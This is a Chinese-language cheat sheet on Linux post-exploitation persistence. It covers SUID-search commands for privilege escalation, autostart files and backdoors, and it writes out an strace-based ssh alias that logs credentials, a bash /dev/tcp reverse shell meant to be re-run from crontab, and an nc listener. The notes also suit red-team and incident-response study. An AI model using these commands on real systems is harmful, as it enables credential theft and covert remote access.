持久化 - Linux
========================================

权限提升
----------------------------------------
- 内核漏洞利用
- 攻击有root权限的服务
- 利用第三方服务提权
- 通过有SUID属性的可执行文件
    - 查找可能提权的可执行文件
    - ``find / -perm +4000 -ls``
    - ``find / -perm -u=s -type f 2>/dev/null``
    - ``find / -user root -perm -4000 -print 2>/dev/null``
    - ``find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null``
- 利用可用的root权限
    - ``sudo -l``
- 利用误配置的 crontab 任务

自启动
----------------------------------------
- /etc/init.d
- /etc/rc.d/rc.local
- ~/.bashrc
- ~/.zshrc

后门
----------------------------------------
- ssh 后门
    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
    - 后门账户

- 反弹Shell
    - ``bash -i >& /dev/tcp/192.168.28.131/12345  0>&1``
        - 可用于添加``crontab -e`` 周期性反弹
        - ``nc -lvp 12345`` 监听
- 常见应用
    - ICMP
    - DNS
- icmp后门
- 后门端口复用
- ``.`` 开头隐藏文件
- rootkit


参考链接
----------------------------------------
- `Linux 持续化 <https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html>`_